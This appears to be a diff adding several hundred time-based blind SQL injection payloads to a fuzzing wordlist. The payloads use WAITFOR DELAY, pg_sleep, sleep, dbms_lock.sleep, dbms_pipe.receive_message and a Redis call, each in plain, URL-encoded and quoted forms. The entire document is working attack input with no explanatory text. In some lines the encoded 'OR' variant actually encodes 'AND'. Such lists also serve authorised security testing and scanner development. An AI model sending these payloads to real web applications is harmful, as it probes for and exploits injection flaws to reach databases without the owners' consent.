+ AND;AND WAITFOR DELAY '00:00:25' #
+%20AND%3BAND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20%23
++AND%3BAND+WAITFOR+DELAY+%2700%3A00%3A25%27+%23
+" AND;AND WAITFOR DELAY '00:00:25' #"
+ OR;OR WAITFOR DELAY '00:00:25' #
+%20OR%3BOR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20%23
++OR%3BOR+WAITFOR+DELAY+%2700%3A00%3A25%27+%23
+" OR;OR WAITFOR DELAY '00:00:25' #"
+; AND WAITFOR DELAY '00:00:25'+#
+%3B%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B%23
+"; AND WAITFOR DELAY '00:00:25'+#"
+; OR WAITFOR DELAY '00:00:25'+#
+%3B%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B%23
+"; OR WAITFOR DELAY '00:00:25'+#"
+; AND WAITFOR DELAY '00:00:25' #
+%3B%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20%23
+"; AND WAITFOR DELAY '00:00:25' #"
+; OR WAITFOR DELAY '00:00:25' #
+%3B%20OR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20%23
+"; OR WAITFOR DELAY '00:00:25' #"
+; pg_sleep(25) /**/
+%3B%20pg_sleep%2825%29%20/%2A%2A/
+%3B+pg_sleep%2825%29+%2F%2A%2A%2F
+'; pg_sleep(25) /**/'
+;+pg_sleep(25)+/**/
+%3B%2Bpg_sleep%2825%29%2B/%2A%2A/
+';+pg_sleep(25)+/**/'
+ OR;+pg_sleep(25)+/**/
+%20OR%3B%2Bpg_sleep%2825%29%2B/%2A%2A/
+' OR;+pg_sleep(25)+/**/'
+ AND;+pg_sleep(25)+/**/
+%20AND%3B%2Bpg_sleep%2825%29%2B/%2A%2A/
+' AND;+pg_sleep(25)+/**/'
+ AND;AND pg_sleep(25) /**/
+%20AND%3BAND%20pg_sleep%2825%29%20/%2A%2A/
++AND%3BAND+pg_sleep%2825%29+%2F%2A%2A%2F
+' AND;AND pg_sleep(25) /**/'
+ OR;OR pg_sleep(25) /**/
+%20OR%3BOR%20pg_sleep%2825%29%20/%2A%2A/
++OR%3BOR+pg_sleep%2825%29+%2F%2A%2A%2F
+' OR;OR pg_sleep(25) /**/'
+; AND pg_sleep(25)+/**/
+%3B%20AND%20pg_sleep%2825%29%2B/%2A%2A/
+'; AND pg_sleep(25)+/**/'
+; OR pg_sleep(25)+/**/
+%3B%20AND%20pg_sleep%2825%29%2B/%2A%2A/
+'; OR pg_sleep(25)+/**/'
+; AND pg_sleep(25) /**/
+%3B%20AND%20pg_sleep%2825%29%20/%2A%2A/
+'; AND pg_sleep(25) /**/'
+; OR pg_sleep(25) /**/
+%3B%20OR%20pg_sleep%2825%29%20/%2A%2A/
+'; OR pg_sleep(25) /**/'
+; dbms_pipe.receive_message(('a'),25) /**/
+%3B%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20/%2A%2A/
+%3B+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+%2F%2A%2A%2F
+"; dbms_pipe.receive_message(('a'),25) /**/"
+;+dbms_pipe.receive_message(('a'),25)+/**/
+%3B%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B/%2A%2A/
+";+dbms_pipe.receive_message(('a'),25)+/**/"
+ OR;+dbms_pipe.receive_message(('a'),25)+/**/
+%20OR%3B%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B/%2A%2A/
+" OR;+dbms_pipe.receive_message(('a'),25)+/**/"
+ AND;+dbms_pipe.receive_message(('a'),25)+/**/
+%20AND%3B%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B/%2A%2A/
+" AND;+dbms_pipe.receive_message(('a'),25)+/**/"
+ AND;AND dbms_pipe.receive_message(('a'),25) /**/
+%20AND%3BAND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20/%2A%2A/
++AND%3BAND+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+%2F%2A%2A%2F
+" AND;AND dbms_pipe.receive_message(('a'),25) /**/"
+ OR;OR dbms_pipe.receive_message(('a'),25) /**/
+%20OR%3BOR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20/%2A%2A/
++OR%3BOR+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+%2F%2A%2A%2F
+" OR;OR dbms_pipe.receive_message(('a'),25) /**/"
+; AND dbms_pipe.receive_message(('a'),25)+/**/
+%3B%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B/%2A%2A/
+"; AND dbms_pipe.receive_message(('a'),25)+/**/"
+; OR dbms_pipe.receive_message(('a'),25)+/**/
+%3B%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B/%2A%2A/
+"; OR dbms_pipe.receive_message(('a'),25)+/**/"
+; AND dbms_pipe.receive_message(('a'),25) /**/
+%3B%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20/%2A%2A/
+"; AND dbms_pipe.receive_message(('a'),25) /**/"
+; OR dbms_pipe.receive_message(('a'),25) /**/
+%3B%20OR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20/%2A%2A/
+"; OR dbms_pipe.receive_message(('a'),25) /**/"
+; sleep(25) /**/
+%3B%20sleep%2825%29%20/%2A%2A/
+%3B+sleep%2825%29+%2F%2A%2A%2F
+'; sleep(25) /**/'
+;+sleep(25)+/**/
+%3B%2Bsleep%2825%29%2B/%2A%2A/
+';+sleep(25)+/**/'
+ OR;+sleep(25)+/**/
+%20OR%3B%2Bsleep%2825%29%2B/%2A%2A/
+' OR;+sleep(25)+/**/'
+ AND;+sleep(25)+/**/
+%20AND%3B%2Bsleep%2825%29%2B/%2A%2A/
+' AND;+sleep(25)+/**/'
+ AND;AND sleep(25) /**/
+%20AND%3BAND%20sleep%2825%29%20/%2A%2A/
++AND%3BAND+sleep%2825%29+%2F%2A%2A%2F
+' AND;AND sleep(25) /**/'
+ OR;OR sleep(25) /**/
+%20OR%3BOR%20sleep%2825%29%20/%2A%2A/
++OR%3BOR+sleep%2825%29+%2F%2A%2A%2F
+' OR;OR sleep(25) /**/'
+; AND sleep(25)+/**/
+%3B%20AND%20sleep%2825%29%2B/%2A%2A/
+'; AND sleep(25)+/**/'
+; OR sleep(25)+/**/
+%3B%20AND%20sleep%2825%29%2B/%2A%2A/
+'; OR sleep(25)+/**/'
+; AND sleep(25) /**/
+%3B%20AND%20sleep%2825%29%20/%2A%2A/
+'; AND sleep(25) /**/'
+; OR sleep(25) /**/
+%3B%20OR%20sleep%2825%29%20/%2A%2A/
+'; OR sleep(25) /**/'
+; dbms_lock.sleep(25) /**/
+%3B%20dbms_lock.sleep%2825%29%20/%2A%2A/
+%3B+dbms_lock.sleep%2825%29+%2F%2A%2A%2F
+'; dbms_lock.sleep(25) /**/'
+;+dbms_lock.sleep(25)+/**/
+%3B%2Bdbms_lock.sleep%2825%29%2B/%2A%2A/
+';+dbms_lock.sleep(25)+/**/'
+ OR;+dbms_lock.sleep(25)+/**/
+%20OR%3B%2Bdbms_lock.sleep%2825%29%2B/%2A%2A/
+' OR;+dbms_lock.sleep(25)+/**/'
+ AND;+dbms_lock.sleep(25)+/**/
+%20AND%3B%2Bdbms_lock.sleep%2825%29%2B/%2A%2A/
+' AND;+dbms_lock.sleep(25)+/**/'
+ AND;AND dbms_lock.sleep(25) /**/
+%20AND%3BAND%20dbms_lock.sleep%2825%29%20/%2A%2A/
++AND%3BAND+dbms_lock.sleep%2825%29+%2F%2A%2A%2F
+' AND;AND dbms_lock.sleep(25) /**/'
+ OR;OR dbms_lock.sleep(25) /**/
+%20OR%3BOR%20dbms_lock.sleep%2825%29%20/%2A%2A/
++OR%3BOR+dbms_lock.sleep%2825%29+%2F%2A%2A%2F
+' OR;OR dbms_lock.sleep(25) /**/'
+; AND dbms_lock.sleep(25)+/**/
+%3B%20AND%20dbms_lock.sleep%2825%29%2B/%2A%2A/
+'; AND dbms_lock.sleep(25)+/**/'
+; OR dbms_lock.sleep(25)+/**/
+%3B%20AND%20dbms_lock.sleep%2825%29%2B/%2A%2A/
+'; OR dbms_lock.sleep(25)+/**/'
+; AND dbms_lock.sleep(25) /**/
+%3B%20AND%20dbms_lock.sleep%2825%29%20/%2A%2A/
+'; AND dbms_lock.sleep(25) /**/'
+; OR dbms_lock.sleep(25) /**/
+%3B%20OR%20dbms_lock.sleep%2825%29%20/%2A%2A/
+'; OR dbms_lock.sleep(25) /**/'
+; redis.call("TIME")[25] /**/
+%3B%20redis.call%28%22TIME%22%29%5B25%5D%20/%2A%2A/
+%3B+redis.call%28%22TIME%22%29%5B25%5D+%2F%2A%2A%2F
+'; redis.call("TIME")[25] /**/'
+;+redis.call("TIME")[25]+/**/
+%3B%2Bredis.call%28%22TIME%22%29%5B25%5D%2B/%2A%2A/
+';+redis.call("TIME")[25]+/**/'
+ OR;+redis.call("TIME")[25]+/**/
+%20OR%3B%2Bredis.call%28%22TIME%22%29%5B25%5D%2B/%2A%2A/
+' OR;+redis.call("TIME")[25]+/**/'
+ AND;+redis.call("TIME")[25]+/**/
+%20AND%3B%2Bredis.call%28%22TIME%22%29%5B25%5D%2B/%2A%2A/
+' AND;+redis.call("TIME")[25]+/**/'
+ AND;AND redis.call("TIME")[25] /**/
+%20AND%3BAND%20redis.call%28%22TIME%22%29%5B25%5D%20/%2A%2A/
++AND%3BAND+redis.call%28%22TIME%22%29%5B25%5D+%2F%2A%2A%2F
+' AND;AND redis.call("TIME")[25] /**/'
+ OR;OR redis.call("TIME")[25] /**/
+%20OR%3BOR%20redis.call%28%22TIME%22%29%5B25%5D%20/%2A%2A/
++OR%3BOR+redis.call%28%22TIME%22%29%5B25%5D+%2F%2A%2A%2F
+' OR;OR redis.call("TIME")[25] /**/'
+; AND redis.call("TIME")[25]+/**/
+%3B%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B/%2A%2A/
+'; AND redis.call("TIME")[25]+/**/'
+; OR redis.call("TIME")[25]+/**/
+%3B%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B/%2A%2A/
+'; OR redis.call("TIME")[25]+/**/'
+; AND redis.call("TIME")[25] /**/
+%3B%20AND%20redis.call%28%22TIME%22%29%5B25%5D%20/%2A%2A/
+'; AND redis.call("TIME")[25] /**/'
+; OR redis.call("TIME")[25] /**/
+%3B%20OR%20redis.call%28%22TIME%22%29%5B25%5D%20/%2A%2A/
+'; OR redis.call("TIME")[25] /**/'
+; WAITFOR DELAY '00:00:25' /**/
+%3B%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20/%2A%2A/
+%3B+WAITFOR+DELAY+%2700%3A00%3A25%27+%2F%2A%2A%2F
+"; WAITFOR DELAY '00:00:25' /**/"
+;+WAITFOR DELAY '00:00:25'+/**/
+%3B%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B/%2A%2A/
+";+WAITFOR DELAY '00:00:25'+/**/"
+ OR;+WAITFOR DELAY '00:00:25'+/**/
+%20OR%3B%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B/%2A%2A/
+" OR;+WAITFOR DELAY '00:00:25'+/**/"
+ AND;+WAITFOR DELAY '00:00:25'+/**/
+%20AND%3B%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B/%2A%2A/
+" AND;+WAITFOR DELAY '00:00:25'+/**/"
+ AND;AND WAITFOR DELAY '00:00:25' /**/
+%20AND%3BAND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20/%2A%2A/
++AND%3BAND+WAITFOR+DELAY+%2700%3A00%3A25%27+%2F%2A%2A%2F
+" AND;AND WAITFOR DELAY '00:00:25' /**/"
+ OR;OR WAITFOR DELAY '00:00:25' /**/
+%20OR%3BOR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20/%2A%2A/
++OR%3BOR+WAITFOR+DELAY+%2700%3A00%3A25%27+%2F%2A%2A%2F
+" OR;OR WAITFOR DELAY '00:00:25' /**/"
+; AND WAITFOR DELAY '00:00:25'+/**/
+%3B%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B/%2A%2A/
+"; AND WAITFOR DELAY '00:00:25'+/**/"
+; OR WAITFOR DELAY '00:00:25'+/**/
+%3B%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B/%2A%2A/
+"; OR WAITFOR DELAY '00:00:25'+/**/"
+; AND WAITFOR DELAY '00:00:25' /**/
+%3B%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20/%2A%2A/
+"; AND WAITFOR DELAY '00:00:25' /**/"
+; OR WAITFOR DELAY '00:00:25' /**/
+%3B%20OR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20/%2A%2A/
+"; OR WAITFOR DELAY '00:00:25' /**/"
+; pg_sleep(25) -- -
+%3B%20pg_sleep%2825%29%20--%20-
+%3B+pg_sleep%2825%29+--+-
+'; pg_sleep(25) -- -'
+;+pg_sleep(25)+-- -
+%3B%2Bpg_sleep%2825%29%2B--%20-
+';+pg_sleep(25)+-- -'
+ OR;+pg_sleep(25)+-- -
+%20OR%3B%2Bpg_sleep%2825%29%2B--%20-
+' OR;+pg_sleep(25)+-- -'
+ AND;+pg_sleep(25)+-- -
+%20AND%3B%2Bpg_sleep%2825%29%2B--%20-
+' AND;+pg_sleep(25)+-- -'
+ AND;AND pg_sleep(25) -- -
+%20AND%3BAND%20pg_sleep%2825%29%20--%20-
++AND%3BAND+pg_sleep%2825%29+--+-
+' AND;AND pg_sleep(25) -- -'
+ OR;OR pg_sleep(25) -- -
+%20OR%3BOR%20pg_sleep%2825%29%20--%20-
++OR%3BOR+pg_sleep%2825%29+--+-
+' OR;OR pg_sleep(25) -- -'
+; AND pg_sleep(25)+-- -
+%3B%20AND%20pg_sleep%2825%29%2B--%20-
+'; AND pg_sleep(25)+-- -'
+; OR pg_sleep(25)+-- -
+%3B%20AND%20pg_sleep%2825%29%2B--%20-
+'; OR pg_sleep(25)+-- -'
+; AND pg_sleep(25) -- -
+%3B%20AND%20pg_sleep%2825%29%20--%20-
+'; AND pg_sleep(25) -- -'
+; OR pg_sleep(25) -- -
+%3B%20OR%20pg_sleep%2825%29%20--%20-
+'; OR pg_sleep(25) -- -'
+; dbms_pipe.receive_message(('a'),25) -- -
+%3B%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%20-
+%3B+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--+-
+"; dbms_pipe.receive_message(('a'),25) -- -"
+;+dbms_pipe.receive_message(('a'),25)+-- -
+%3B%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%20-
+";+dbms_pipe.receive_message(('a'),25)+-- -"
+ OR;+dbms_pipe.receive_message(('a'),25)+-- -
+%20OR%3B%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%20-
+" OR;+dbms_pipe.receive_message(('a'),25)+-- -"
+ AND;+dbms_pipe.receive_message(('a'),25)+-- -
+%20AND%3B%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%20-
+" AND;+dbms_pipe.receive_message(('a'),25)+-- -"
+ AND;AND dbms_pipe.receive_message(('a'),25) -- -
+%20AND%3BAND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%20-
++AND%3BAND+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--+-
+" AND;AND dbms_pipe.receive_message(('a'),25) -- -"
+ OR;OR dbms_pipe.receive_message(('a'),25) -- -
+%20OR%3BOR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%20-
++OR%3BOR+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--+-
+" OR;OR dbms_pipe.receive_message(('a'),25) -- -"
+; AND dbms_pipe.receive_message(('a'),25)+-- -
+%3B%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%20-
+"; AND dbms_pipe.receive_message(('a'),25)+-- -"
+; OR dbms_pipe.receive_message(('a'),25)+-- -
+%3B%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%20-
+"; OR dbms_pipe.receive_message(('a'),25)+-- -"
+; AND dbms_pipe.receive_message(('a'),25) -- -
+%3B%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%20-
+"; AND dbms_pipe.receive_message(('a'),25) -- -"
+; OR dbms_pipe.receive_message(('a'),25) -- -
+%3B%20OR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%20-
+"; OR dbms_pipe.receive_message(('a'),25) -- -"
+; sleep(25) -- -
+%3B%20sleep%2825%29%20--%20-
+%3B+sleep%2825%29+--+-
+'; sleep(25) -- -'
+;+sleep(25)+-- -
+%3B%2Bsleep%2825%29%2B--%20-
+';+sleep(25)+-- -'
+ OR;+sleep(25)+-- -
+%20OR%3B%2Bsleep%2825%29%2B--%20-
+' OR;+sleep(25)+-- -'
+ AND;+sleep(25)+-- -
+%20AND%3B%2Bsleep%2825%29%2B--%20-
+' AND;+sleep(25)+-- -'
+ AND;AND sleep(25) -- -
+%20AND%3BAND%20sleep%2825%29%20--%20-
++AND%3BAND+sleep%2825%29+--+-
+' AND;AND sleep(25) -- -'
+ OR;OR sleep(25) -- -
+%20OR%3BOR%20sleep%2825%29%20--%20-
++OR%3BOR+sleep%2825%29+--+-
+' OR;OR sleep(25) -- -'
+; AND sleep(25)+-- -
+%3B%20AND%20sleep%2825%29%2B--%20-
+'; AND sleep(25)+-- -'
+; OR sleep(25)+-- -
+%3B%20AND%20sleep%2825%29%2B--%20-
+'; OR sleep(25)+-- -'
+; AND sleep(25) -- -
+%3B%20AND%20sleep%2825%29%20--%20-
+'; AND sleep(25) -- -'
+; OR sleep(25) -- -
+%3B%20OR%20sleep%2825%29%20--%20-
+'; OR sleep(25) -- -'
+; dbms_lock.sleep(25) -- -
+%3B%20dbms_lock.sleep%2825%29%20--%20-
+%3B+dbms_lock.sleep%2825%29+--+-
+'; dbms_lock.sleep(25) -- -'
+;+dbms_lock.sleep(25)+-- -
+%3B%2Bdbms_lock.sleep%2825%29%2B--%20-
+';+dbms_lock.sleep(25)+-- -'
+ OR;+dbms_lock.sleep(25)+-- -
+%20OR%3B%2Bdbms_lock.sleep%2825%29%2B--%20-
+' OR;+dbms_lock.sleep(25)+-- -'
+ AND;+dbms_lock.sleep(25)+-- -
+%20AND%3B%2Bdbms_lock.sleep%2825%29%2B--%20-
+' AND;+dbms_lock.sleep(25)+-- -'
+ AND;AND dbms_lock.sleep(25) -- -
+%20AND%3BAND%20dbms_lock.sleep%2825%29%20--%20-
++AND%3BAND+dbms_lock.sleep%2825%29+--+-
+' AND;AND dbms_lock.sleep(25) -- -'
+ OR;OR dbms_lock.sleep(25) -- -
+%20OR%3BOR%20dbms_lock.sleep%2825%29%20--%20-
++OR%3BOR+dbms_lock.sleep%2825%29+--+-
+' OR;OR dbms_lock.sleep(25) -- -'
+; AND dbms_lock.sleep(25)+-- -
+%3B%20AND%20dbms_lock.sleep%2825%29%2B--%20-
+'; AND dbms_lock.sleep(25)+-- -'
+; OR dbms_lock.sleep(25)+-- -
+%3B%20AND%20dbms_lock.sleep%2825%29%2B--%20-
+'; OR dbms_lock.sleep(25)+-- -'
+; AND dbms_lock.sleep(25) -- -
+%3B%20AND%20dbms_lock.sleep%2825%29%20--%20-
+'; AND dbms_lock.sleep(25) -- -'
+; OR dbms_lock.sleep(25) -- -
+%3B%20OR%20dbms_lock.sleep%2825%29%20--%20-
+'; OR dbms_lock.sleep(25) -- -'
+; redis.call("TIME")[25] -- -
+%3B%20redis.call%28%22TIME%22%29%5B25%5D%20--%20-
+%3B+redis.call%28%22TIME%22%29%5B25%5D+--+-
+'; redis.call("TIME")[25] -- -'
+;+redis.call("TIME")[25]+-- -
+%3B%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--%20-
+';+redis.call("TIME")[25]+-- -'
+ OR;+redis.call("TIME")[25]+-- -
+%20OR%3B%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--%20-
+' OR;+redis.call("TIME")[25]+-- -'
+ AND;+redis.call("TIME")[25]+-- -
+%20AND%3B%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--%20-
+' AND;+redis.call("TIME")[25]+-- -'
+ AND;AND redis.call("TIME")[25] -- -
+%20AND%3BAND%20redis.call%28%22TIME%22%29%5B25%5D%20--%20-
++AND%3BAND+redis.call%28%22TIME%22%29%5B25%5D+--+-
+' AND;AND redis.call("TIME")[25] -- -'
+ OR;OR redis.call("TIME")[25] -- -
+%20OR%3BOR%20redis.call%28%22TIME%22%29%5B25%5D%20--%20-
++OR%3BOR+redis.call%28%22TIME%22%29%5B25%5D+--+-
+' OR;OR redis.call("TIME")[25] -- -'
+; AND redis.call("TIME")[25]+-- -
+%3B%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B--%20-
+'; AND redis.call("TIME")[25]+-- -'
+; OR redis.call("TIME")[25]+-- -
+%3B%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B--%20-
+'; OR redis.call("TIME")[25]+-- -'
+; AND redis.call("TIME")[25] -- -
+%3B%20AND%20redis.call%28%22TIME%22%29%5B25%5D%20--%20-
+'; AND redis.call("TIME")[25] -- -'
+; OR redis.call("TIME")[25] -- -
+%3B%20OR%20redis.call%28%22TIME%22%29%5B25%5D%20--%20-
+'; OR redis.call("TIME")[25] -- -'
+; WAITFOR DELAY '00:00:25' -- -
+%3B%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%20-
+%3B+WAITFOR+DELAY+%2700%3A00%3A25%27+--+-
+"; WAITFOR DELAY '00:00:25' -- -"
+;+WAITFOR DELAY '00:00:25'+-- -
+%3B%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%20-
+";+WAITFOR DELAY '00:00:25'+-- -"
+ OR;+WAITFOR DELAY '00:00:25'+-- -
+%20OR%3B%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%20-
+" OR;+WAITFOR DELAY '00:00:25'+-- -"
+ AND;+WAITFOR DELAY '00:00:25'+-- -
+%20AND%3B%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%20-
+" AND;+WAITFOR DELAY '00:00:25'+-- -"
+ AND;AND WAITFOR DELAY '00:00:25' -- -
+%20AND%3BAND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%20-
++AND%3BAND+WAITFOR+DELAY+%2700%3A00%3A25%27+--+-
+" AND;AND WAITFOR DELAY '00:00:25' -- -"
+ OR;OR WAITFOR DELAY '00:00:25' -- -
+%20OR%3BOR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%20-
++OR%3BOR+WAITFOR+DELAY+%2700%3A00%3A25%27+--+-
+" OR;OR WAITFOR DELAY '00:00:25' -- -"
+; AND WAITFOR DELAY '00:00:25'+-- -
+%3B%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%20-
+"; AND WAITFOR DELAY '00:00:25'+-- -"
+; OR WAITFOR DELAY '00:00:25'+-- -
+%3B%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%20-
+"; OR WAITFOR DELAY '00:00:25'+-- -"
+; AND WAITFOR DELAY '00:00:25' -- -
+%3B%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%20-
+"; AND WAITFOR DELAY '00:00:25' -- -"
+; OR WAITFOR DELAY '00:00:25' -- -
+%3B%20OR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%20-
+"; OR WAITFOR DELAY '00:00:25' -- -"
+" pg_sleep(25) --
+%22%20pg_sleep%2825%29%20--
+%22+pg_sleep%2825%29+--
+'" pg_sleep(25) --'
+"+pg_sleep(25)+--
+%22%2Bpg_sleep%2825%29%2B--
+'"+pg_sleep(25)+--'
+ OR"+pg_sleep(25)+--
+%20OR%22%2Bpg_sleep%2825%29%2B--
+' OR"+pg_sleep(25)+--'
+ AND"+pg_sleep(25)+--
+%20AND%22%2Bpg_sleep%2825%29%2B--
+' AND"+pg_sleep(25)+--'
+ AND"AND pg_sleep(25) --
+%20AND%22AND%20pg_sleep%2825%29%20--
++AND%22AND+pg_sleep%2825%29+--
+' AND"AND pg_sleep(25) --'
+ OR"OR pg_sleep(25) --
+%20OR%22OR%20pg_sleep%2825%29%20--
++OR%22OR+pg_sleep%2825%29+--
+' OR"OR pg_sleep(25) --'
+" AND pg_sleep(25)+--
+%22%20AND%20pg_sleep%2825%29%2B--
+'" AND pg_sleep(25)+--'
+" OR pg_sleep(25)+--
+%22%20AND%20pg_sleep%2825%29%2B--
+'" OR pg_sleep(25)+--'
+" AND pg_sleep(25) --
+%22%20AND%20pg_sleep%2825%29%20--
+'" AND pg_sleep(25) --'
+" OR pg_sleep(25) --
+%22%20OR%20pg_sleep%2825%29%20--
+'" OR pg_sleep(25) --'
+" dbms_pipe.receive_message(('a'),25) --
+%22%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--
+%22+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--
+'" dbms_pipe.receive_message((\'a\'),25) --'
+"+dbms_pipe.receive_message(('a'),25)+--
+%22%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--
+'"+dbms_pipe.receive_message((\'a\'),25)+--'
+ OR"+dbms_pipe.receive_message(('a'),25)+--
+%20OR%22%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--
+' OR"+dbms_pipe.receive_message((\'a\'),25)+--'
+ AND"+dbms_pipe.receive_message(('a'),25)+--
+%20AND%22%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--
+' AND"+dbms_pipe.receive_message((\'a\'),25)+--'
+ AND"AND dbms_pipe.receive_message(('a'),25) --
+%20AND%22AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--
++AND%22AND+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--
+' AND"AND dbms_pipe.receive_message((\'a\'),25) --'
+ OR"OR dbms_pipe.receive_message(('a'),25) --
+%20OR%22OR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--
++OR%22OR+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--
+' OR"OR dbms_pipe.receive_message((\'a\'),25) --'
+" AND dbms_pipe.receive_message(('a'),25)+--
+%22%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--
+'" AND dbms_pipe.receive_message((\'a\'),25)+--'
+" OR dbms_pipe.receive_message(('a'),25)+--
+%22%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--
+'" OR dbms_pipe.receive_message((\'a\'),25)+--'
+" AND dbms_pipe.receive_message(('a'),25) --
+%22%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--
+'" AND dbms_pipe.receive_message((\'a\'),25) --'
+" OR dbms_pipe.receive_message(('a'),25) --
+%22%20OR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--
+'" OR dbms_pipe.receive_message((\'a\'),25) --'
+" sleep(25) --
+%22%20sleep%2825%29%20--
+%22+sleep%2825%29+--
+'" sleep(25) --'
+"+sleep(25)+--
+%22%2Bsleep%2825%29%2B--
+'"+sleep(25)+--'
+ OR"+sleep(25)+--
+%20OR%22%2Bsleep%2825%29%2B--
+' OR"+sleep(25)+--'
+ AND"+sleep(25)+--
+%20AND%22%2Bsleep%2825%29%2B--
+' AND"+sleep(25)+--'
+ AND"AND sleep(25) --
+%20AND%22AND%20sleep%2825%29%20--
++AND%22AND+sleep%2825%29+--
+' AND"AND sleep(25) --'
+ OR"OR sleep(25) --
+%20OR%22OR%20sleep%2825%29%20--
++OR%22OR+sleep%2825%29+--
+' OR"OR sleep(25) --'
+" AND sleep(25)+--
+%22%20AND%20sleep%2825%29%2B--
+'" AND sleep(25)+--'
+" OR sleep(25)+--
+%22%20AND%20sleep%2825%29%2B--
+'" OR sleep(25)+--'
+" AND sleep(25) --
+%22%20AND%20sleep%2825%29%20--
+'" AND sleep(25) --'
+" OR sleep(25) --
+%22%20OR%20sleep%2825%29%20--
+'" OR sleep(25) --'
+" dbms_lock.sleep(25) --
+%22%20dbms_lock.sleep%2825%29%20--
+%22+dbms_lock.sleep%2825%29+--
+'" dbms_lock.sleep(25) --'
+"+dbms_lock.sleep(25)+--
+%22%2Bdbms_lock.sleep%2825%29%2B--
+'"+dbms_lock.sleep(25)+--'
+ OR"+dbms_lock.sleep(25)+--
+%20OR%22%2Bdbms_lock.sleep%2825%29%2B--
+' OR"+dbms_lock.sleep(25)+--'
+ AND"+dbms_lock.sleep(25)+--
+%20AND%22%2Bdbms_lock.sleep%2825%29%2B--
+' AND"+dbms_lock.sleep(25)+--'
+ AND"AND dbms_lock.sleep(25) --
+%20AND%22AND%20dbms_lock.sleep%2825%29%20--
++AND%22AND+dbms_lock.sleep%2825%29+--
+' AND"AND dbms_lock.sleep(25) --'
+ OR"OR dbms_lock.sleep(25) --
+%20OR%22OR%20dbms_lock.sleep%2825%29%20--
++OR%22OR+dbms_lock.sleep%2825%29+--
+' OR"OR dbms_lock.sleep(25) --'
+" AND dbms_lock.sleep(25)+--
+%22%20AND%20dbms_lock.sleep%2825%29%2B--
+'" AND dbms_lock.sleep(25)+--'
+" OR dbms_lock.sleep(25)+--
+%22%20AND%20dbms_lock.sleep%2825%29%2B--
+'" OR dbms_lock.sleep(25)+--'
+" AND dbms_lock.sleep(25) --
+%22%20AND%20dbms_lock.sleep%2825%29%20--
+'" AND dbms_lock.sleep(25) --'
+" OR dbms_lock.sleep(25) --
